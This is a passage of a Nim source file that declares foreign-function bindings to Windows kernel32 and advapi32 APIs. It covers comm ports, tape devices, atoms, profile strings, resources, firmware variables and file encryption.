PowerSetRequest*(PowerRequest: HANDLE, RequestType: POWER_REQUEST_TYPE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc PowerClearRequest*(PowerRequest: HANDLE, RequestType: POWER_REQUEST_TYPE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFileCompletionNotificationModes*(FileHandle: HANDLE, Flags: UCHAR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFileIoOverlappedRange*(FileHandle: HANDLE, OverlappedRangeStart: PUCHAR, Length: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetThreadErrorMode*(): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetThreadErrorMode*(dwNewMode: DWORD, lpOldMode: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc Wow64GetThreadContext*(hThread: HANDLE, lpContext: PWOW64_CONTEXT): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc Wow64SetThreadContext*(hThread: HANDLE, lpContext: ptr WOW64_CONTEXT): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc Wow64GetThreadSelectorEntry*(hThread: HANDLE, dwSelector: DWORD, lpSelectorEntry: PWOW64_LDT_ENTRY): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc Wow64SuspendThread*(hThread: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc DebugSetProcessKillOnExit*(KillOnExit: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DebugBreakProcess*(Process: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc PulseEvent*(hEvent: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WaitForMultipleObjects*(nCount: DWORD, lpHandles: ptr HANDLE, bWaitAll: WINBOOL, dwMilliseconds: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalDeleteAtom*(nAtom: ATOM): ATOM {.winapi, stdcall, dynlib: "kernel32", importc.}proc InitAtomTable*(nSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeleteAtom*(nAtom: ATOM): ATOM {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetHandleCount*(uNumber: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc RequestDeviceWakeup*(hDevice: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CancelDeviceWakeupRequest*(hDevice: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetDevicePowerState*(hDevice: HANDLE, pfOn: ptr WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetMessageWaitingIndicator*(hMsgIndicator: HANDLE, ulMsgCount: ULONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFileShortNameA*(hFile: HANDLE, lpShortName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFileShortNameW*(hFile: HANDLE, lpShortName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc LoadModule*(lpModuleName: LPCSTR, lpParameterBlock: LPVOID): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc WinExec*(lpCmdLine: LPCSTR, uCmdShow: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc ClearCommBreak*(hFile: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc ClearCommError*(hFile: HANDLE, lpErrors: LPDWORD, lpStat: LPCOMSTAT): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetupComm*(hFile: HANDLE, dwInQueue: DWORD, dwOutQueue: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EscapeCommFunction*(hFile: HANDLE, dwFunc: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCommConfig*(hCommDev: HANDLE, lpCC: LPCOMMCONFIG, lpdwSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCommMask*(hFile: HANDLE, lpEvtMask: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCommProperties*(hFile: HANDLE, lpCommProp: LPCOMMPROP): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCommModemStatus*(hFile: HANDLE, lpModemStat: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCommState*(hFile: HANDLE, lpDCB: LPDCB): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetCommTimeouts*(hFile: HANDLE, lpCommTimeouts: LPCOMMTIMEOUTS): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc PurgeComm*(hFile: HANDLE, dwFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetCommBreak*(hFile: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetCommConfig*(hCommDev: HANDLE, lpCC: LPCOMMCONFIG, dwSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetCommMask*(hFile: HANDLE, dwEvtMask: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetCommState*(hFile: HANDLE, lpDCB: LPDCB): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetCommTimeouts*(hFile: HANDLE, lpCommTimeouts: LPCOMMTIMEOUTS): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc TransmitCommChar*(hFile: HANDLE, cChar: char): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WaitCommEvent*(hFile: HANDLE, lpEvtMask: LPDWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetTapePosition*(hDevice: HANDLE, dwPositionMethod: DWORD, dwPartition: DWORD, dwOffsetLow: DWORD, dwOffsetHigh: DWORD, bImmediate: WINBOOL): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetTapePosition*(hDevice: HANDLE, dwPositionType: DWORD, lpdwPartition: LPDWORD, lpdwOffsetLow: LPDWORD, lpdwOffsetHigh: LPDWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc PrepareTape*(hDevice: HANDLE, dwOperation: DWORD, bImmediate: WINBOOL): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc EraseTape*(hDevice: HANDLE, dwEraseType: DWORD, bImmediate: WINBOOL): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateTapePartition*(hDevice: HANDLE, dwPartitionMethod: DWORD, dwCount: DWORD, dwSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc WriteTapemark*(hDevice: HANDLE, dwTapemarkType: DWORD, dwTapemarkCount: DWORD, bImmediate: WINBOOL): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetTapeStatus*(hDevice: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetTapeParameters*(hDevice: HANDLE, dwOperation: DWORD, lpdwSize: LPDWORD, lpTapeInformation: LPVOID): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetTapeParameters*(hDevice: HANDLE, dwOperation: DWORD, lpTapeInformation: LPVOID): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemDEPPolicy*(): DEP_SYSTEM_POLICY_TYPE {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemRegistryQuota*(pdwQuotaAllowed: PDWORD, pdwQuotaUsed: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemTimes*(lpIdleTime: LPFILETIME, lpKernelTime: LPFILETIME, lpUserTime: LPFILETIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FileTimeToDosDateTime*(lpFileTime: ptr FILETIME, lpFatDate: LPWORD, lpFatTime: LPWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DosDateTimeToFileTime*(wFatDate: WORD, wFatTime: WORD, lpFileTime: LPFILETIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetSystemTimeAdjustment*(dwTimeAdjustment: DWORD, bTimeAdjustmentDisabled: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc MulDiv*(nNumber: int32, nNumerator: int32, nDenominator: int32): int32 {.winapi, stdcall, dynlib: "kernel32", importc.}proc FormatMessageA*(dwFlags: DWORD, lpSource: LPCVOID, dwMessageId: DWORD, dwLanguageId: DWORD, lpBuffer: LPSTR, nSize: DWORD, Arguments: ptr va_list): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc FormatMessageW*(dwFlags: DWORD, lpSource: LPCVOID, dwMessageId: DWORD, dwLanguageId: DWORD, lpBuffer: LPWSTR, nSize: DWORD, Arguments: ptr va_list): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetNamedPipeInfo*(hNamedPipe: HANDLE, lpFlags: LPDWORD, lpOutBufferSize: LPDWORD, lpInBufferSize: LPDWORD, lpMaxInstances: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateMailslotA*(lpName: LPCSTR, nMaxMessageSize: DWORD, lReadTimeout: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateMailslotW*(lpName: LPCWSTR, nMaxMessageSize: DWORD, lReadTimeout: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetMailslotInfo*(hMailslot: HANDLE, lpMaxMessageSize: LPDWORD, lpNextSize: LPDWORD, lpMessageCount: LPDWORD, lpReadTimeout: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetMailslotInfo*(hMailslot: HANDLE, lReadTimeout: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EncryptFileA*(lpFileName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc EncryptFileW*(lpFileName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc DecryptFileA*(lpFileName: LPCSTR, dwReserved: DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc DecryptFileW*(lpFileName: LPCWSTR, dwReserved: DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc FileEncryptionStatusA*(lpFileName: LPCSTR, lpStatus: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc FileEncryptionStatusW*(lpFileName: LPCWSTR, lpStatus: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc OpenEncryptedFileRawA*(lpFileName: LPCSTR, ulFlags: ULONG, pvContext: ptr PVOID): DWORD {.winapi, stdcall, dynlib: "advapi32", importc.}proc OpenEncryptedFileRawW*(lpFileName: LPCWSTR, ulFlags: ULONG, pvContext: ptr PVOID): DWORD {.winapi, stdcall, dynlib: "advapi32", importc.}proc ReadEncryptedFileRaw*(pfExportCallback: PFE_EXPORT_FUNC, pvCallbackContext: PVOID, pvContext: PVOID): DWORD {.winapi, stdcall, dynlib: "advapi32", importc.}proc WriteEncryptedFileRaw*(pfImportCallback: PFE_IMPORT_FUNC, pvCallbackContext: PVOID, pvContext: PVOID): DWORD {.winapi, stdcall, dynlib: "advapi32", importc.}proc CloseEncryptedFileRaw*(pvContext: PVOID): VOID {.winapi, stdcall, dynlib: "advapi32", importc.}proc lstrcmpA*(lpString1: LPCSTR, lpString2: LPCSTR): int32 {.winapi, stdcall, dynlib: "kernel32", importc.}proc lstrcmpW*(lpString1: LPCWSTR, lpString2: LPCWSTR): int32 {.winapi, stdcall, dynlib: "kernel32", importc.}proc lstrcmpiA*(lpString1: LPCSTR, lpString2: LPCSTR): int32 {.winapi, stdcall, dynlib: "kernel32", importc.}proc lstrcmpiW*(lpString1: LPCWSTR, lpString2: LPCWSTR): int32 {.winapi, stdcall, dynlib: "kernel32", importc.}proc lstrcpynA*(lpString1: LPSTR, lpString2: LPCSTR, iMaxLength: int32): LPSTR {.winapi, stdcall, dynlib: "kernel32", importc.}proc lstrcpynW*(lpString1: LPWSTR, lpString2: LPCWSTR, iMaxLength: int32): LPWSTR {.winapi, stdcall, dynlib: "kernel32", importc.}proc lstrcpyA*(lpString1: LPSTR, lpString2: LPCSTR): LPSTR {.winapi, stdcall, dynlib: "kernel32", importc.}proc lstrcpyW*(lpString1: LPWSTR, lpString2: LPCWSTR): LPWSTR {.winapi, stdcall, dynlib: "kernel32", importc.}proc lstrcatA*(lpString1: LPSTR, lpString2: LPCSTR): LPSTR {.winapi, stdcall, dynlib: "kernel32", importc.}proc lstrcatW*(lpString1: LPWSTR, lpString2: LPCWSTR): LPWSTR {.winapi, stdcall, dynlib: "kernel32", importc.}proc lstrlenA*(lpString: LPCSTR): int32 {.winapi, stdcall, dynlib: "kernel32", importc.}proc lstrlenW*(lpString: LPCWSTR): int32 {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenFile*(lpFileName: LPCSTR, lpReOpenBuff: LPOFSTRUCT, uStyle: UINT): HFILE {.winapi, stdcall, dynlib: "kernel32", importc.}proc IsTextUnicode*(lpv: pointer, iSize: int32, lpiResult: LPINT): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc.}proc BackupRead*(hFile: HANDLE, lpBuffer: LPBYTE, nNumberOfBytesToRead: DWORD, lpNumberOfBytesRead: LPDWORD, bAbort: WINBOOL, bProcessSecurity: WINBOOL, lpContext: ptr LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc BackupSeek*(hFile: HANDLE, dwLowBytesToSeek: DWORD, dwHighBytesToSeek: DWORD, lpdwLowByteSeeked: LPDWORD, lpdwHighByteSeeked: LPDWORD, lpContext: ptr LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc BackupWrite*(hFile: HANDLE, lpBuffer: LPBYTE, nNumberOfBytesToWrite: DWORD, lpNumberOfBytesWritten: LPDWORD, bAbort: WINBOOL, bProcessSecurity: WINBOOL, lpContext: ptr LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateSemaphoreW*(lpSemaphoreAttributes: LPSECURITY_ATTRIBUTES, lInitialCount: LONG, lMaximumCount: LONG, lpName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc LoadLibraryW*(lpLibFileName: LPCWSTR): HMODULE {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenMutexA*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateSemaphoreA*(lpSemaphoreAttributes: LPSECURITY_ATTRIBUTES, lInitialCount: LONG, lMaximumCount: LONG, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenSemaphoreA*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateWaitableTimerA*(lpTimerAttributes: LPSECURITY_ATTRIBUTES, bManualReset: WINBOOL, lpTimerName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateWaitableTimerW*(lpTimerAttributes: LPSECURITY_ATTRIBUTES, bManualReset: WINBOOL, lpTimerName: LPCWSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenWaitableTimerA*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpTimerName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateFileMappingA*(hFile: HANDLE, lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, flProtect: DWORD, dwMaximumSizeHigh: DWORD, dwMaximumSizeLow: DWORD, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateSemaphoreExA*(lpSemaphoreAttributes: LPSECURITY_ATTRIBUTES, lInitialCount: LONG, lMaximumCount: LONG, lpName: LPCSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateWaitableTimerExA*(lpTimerAttributes: LPSECURITY_ATTRIBUTES, lpTimerName: LPCSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateFileMappingNumaA*(hFile: HANDLE, lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, flProtect: DWORD, dwMaximumSizeHigh: DWORD, dwMaximumSizeLow: DWORD, lpName: LPCSTR, nndPreferred: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc OpenFileMappingA*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetLogicalDriveStringsA*(nBufferLength: DWORD, lpBuffer: LPSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc LoadLibraryA*(lpLibFileName: LPCSTR): HMODULE {.winapi, stdcall, dynlib: "kernel32", importc.}proc LoadPackagedLibrary*(lpwLibFileName: LPCWSTR, Reserved: DWORD): HMODULE {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryFullProcessImageNameA*(hProcess: HANDLE, dwFlags: DWORD, lpExeName: LPSTR, lpdwSize: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryFullProcessImageNameW*(hProcess: HANDLE, dwFlags: DWORD, lpExeName: LPWSTR, lpdwSize: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessShutdownParameters*(lpdwLevel: LPDWORD, lpdwFlags: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FatalAppExitA*(uAction: UINT, lpMessageText: LPCSTR): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc FatalAppExitW*(uAction: UINT, lpMessageText: LPCWSTR): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetStartupInfoA*(lpStartupInfo: LPSTARTUPINFOA): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFirmwareEnvironmentVariableA*(lpName: LPCSTR, lpGuid: LPCSTR, pBuffer: PVOID, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFirmwareEnvironmentVariableW*(lpName: LPCWSTR, lpGuid: LPCWSTR, pBuffer: PVOID, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFirmwareEnvironmentVariableA*(lpName: LPCSTR, lpGuid: LPCSTR, pValue: PVOID, nSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFirmwareEnvironmentVariableW*(lpName: LPCWSTR, lpGuid: LPCWSTR, pValue: PVOID, nSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindResourceA*(hModule: HMODULE, lpName: LPCSTR, lpType: LPCSTR): HRSRC {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindResourceW*(hModule: HMODULE, lpName: LPCWSTR, lpType: LPCWSTR): HRSRC {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindResourceExA*(hModule: HMODULE, lpType: LPCSTR, lpName: LPCSTR, wLanguage: WORD): HRSRC {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnumResourceTypesA*(hModule: HMODULE, lpEnumFunc: ENUMRESTYPEPROCA, lParam: LONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnumResourceTypesW*(hModule: HMODULE, lpEnumFunc: ENUMRESTYPEPROCW, lParam: LONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnumResourceNamesA*(hModule: HMODULE, lpType: LPCSTR, lpEnumFunc: ENUMRESNAMEPROCA, lParam: LONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EnumResourceNamesW*(hModule: HMODULE, lpType: LPCWSTR, lpEnumFunc: ENUMRESNAMEPROCW, lParam: LONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc BeginUpdateResourceA*(pFileName: LPCSTR, bDeleteExistingResources: WINBOOL): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc BeginUpdateResourceW*(pFileName: LPCWSTR, bDeleteExistingResources: WINBOOL): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc UpdateResourceA*(hUpdate: HANDLE, lpType: LPCSTR, lpName: LPCSTR, wLanguage: WORD, lpData: LPVOID, cb: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc UpdateResourceW*(hUpdate: HANDLE, lpType: LPCWSTR, lpName: LPCWSTR, wLanguage: WORD, lpData: LPVOID, cb: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EndUpdateResourceA*(hUpdate: HANDLE, fDiscard: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc EndUpdateResourceW*(hUpdate: HANDLE, fDiscard: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFirmwareEnvironmentVariableExA*(lpName: LPCSTR, lpGuid: LPCSTR, pBuffer: PVOID, nSize: DWORD, pdwAttribubutes: PDWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFirmwareEnvironmentVariableExW*(lpName: LPCWSTR, lpGuid: LPCWSTR, pBuffer: PVOID, nSize: DWORD, pdwAttribubutes: PDWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFirmwareEnvironmentVariableExA*(lpName: LPCSTR, lpGuid: LPCSTR, pValue: PVOID, nSize: DWORD, dwAttributes: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFirmwareEnvironmentVariableExW*(lpName: LPCWSTR, lpGuid: LPCWSTR, pValue: PVOID, nSize: DWORD, dwAttributes: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFirmwareType*(FirmwareType: PFIRMWARE_TYPE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc IsNativeVhdBoot*(NativeVhdBoot: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalAddAtomA*(lpString: LPCSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalAddAtomW*(lpString: LPCWSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalAddAtomExA*(lpString: LPCSTR, Flags: DWORD): ATOM {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalAddAtomExW*(lpString: LPCWSTR, Flags: DWORD): ATOM {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalFindAtomA*(lpString: LPCSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalFindAtomW*(lpString: LPCWSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalGetAtomNameA*(nAtom: ATOM, lpBuffer: LPSTR, nSize: int32): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GlobalGetAtomNameW*(nAtom: ATOM, lpBuffer: LPWSTR, nSize: int32): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc AddAtomA*(lpString: LPCSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc.}proc AddAtomW*(lpString: LPCWSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindAtomA*(lpString: LPCSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindAtomW*(lpString: LPCWSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetAtomNameA*(nAtom: ATOM, lpBuffer: LPSTR, nSize: int32): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetAtomNameW*(nAtom: ATOM, lpBuffer: LPWSTR, nSize: int32): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProfileIntA*(lpAppName: LPCSTR, lpKeyName: LPCSTR, nDefault: INT): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProfileIntW*(lpAppName: LPCWSTR, lpKeyName: LPCWSTR, nDefault: INT): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProfileStringA*(lpAppName: LPCSTR, lpKeyName: LPCSTR, lpDefault: LPCSTR, lpReturnedString: LPSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProfileStringW*(lpAppName: LPCWSTR, lpKeyName: LPCWSTR, lpDefault: LPCWSTR, lpReturnedString: LPWSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc WriteProfileStringA*(lpAppName: LPCSTR, lpKeyName: LPCSTR, lpString: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WriteProfileStringW*(lpAppName: LPCWSTR, lpKeyName: LPCWSTR, lpString: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProfileSectionA*(lpAppName: LPCSTR, lpReturnedString: LPSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProfileSectionW*(lpAppName: LPCWSTR, lpReturnedString: LPWSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc WriteProfileSectionA*(lpAppName: LPCSTR, lpString: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WriteProfileSectionW*(lpAppName: LPCWSTR, lpString: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetPrivateProfileIntA*(lpAppName: LPCSTR, lpKeyName: LPCSTR, nDefault: INT, lpFileName: LPCSTR): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetPrivateProfileIntW*(lpAppName: LPCWSTR, lpKeyName: LPCWSTR, nDefault: INT, lpFileName: LPCWSTR): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetPrivateProfileStringA*(lpAppName: LPCSTR, lpKeyName: LPCSTR, lpDefault: LPCSTR, lpReturnedString: LPSTR, nSize: DWORD, lpFileName: LPCSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetPrivateProfileStringW*(lpAppName: LPCWSTR, lpKeyName: LPCWSTR, lpDefault: LPCWSTR, lpReturnedString: LPWSTR, nSize: DWORD, lpFileName: LPCWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc WritePrivateProfileStringA*(lpAppName: LPCSTR, lpKeyName: LPCSTR, lpString: LPCSTR, lpFileName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WritePrivateProfileStringW*(lpAppName: LPCWSTR, lpKeyName: LPCWSTR, lpString: LPCWSTR, lpFileName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetPrivateProfileSectionA*(lpAppName: LPCSTR, lpReturnedString: LPSTR, nSize: DWORD, lpFileName: LPCSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetPrivateProfileSectionW*(lpAppName: LPCWSTR, lpReturnedString: LPWSTR, nSize: DWORD, lpFileName: LPCWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc WritePrivateProfileSectionA*(lpAppName: LPCSTR, lpString: LPCSTR, lpFileName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WritePrivateProfileSectionW*(lpAppName: LPCWSTR, lpString: LPCWSTR, lpFileName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetPrivateProfileSectionNamesA*(lpszReturnBuffer: LPSTR, nSize: DWORD, lpFileName: LPCSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetPrivateProfileSectionNamesW*(lpszReturnBuffer: LPWSTR, nSize: DWORD, lpFileName: LPCWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetPrivateProfileStructA*(lpszSection: LPCSTR, lpszKey: LPCSTR, lpStruct: LPVOID, uSizeStruct: UINT, szFile: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetPrivateProfileStructW*(lpszSection: LPCWSTR, lpszKey: LPCWSTR, lpStruct: LPVOID, uSizeStruct: UINT, szFile: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WritePrivateProfileStructA*(lpszSection: LPCSTR, lpszKey: LPCSTR, lpStruct: LPVOID, uSizeStruct: UINT, szFile: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WritePrivateProfileStructW*(lpszSection: LPCWSTR, lpszKey: LPCWSTR, lpStruct: LPVOID, uSizeStruct: UINT, szFile: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetTempPathA*(nBufferLength: DWORD, lpBuffer: LPSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetTempFileNameA*(lpPathName: LPCSTR, lpPrefixString: LPCSTR, uUnique: UINT, lpTempFileName: LPSTR): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetSystemWow64DirectoryA*(lpBuffer: LPSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc 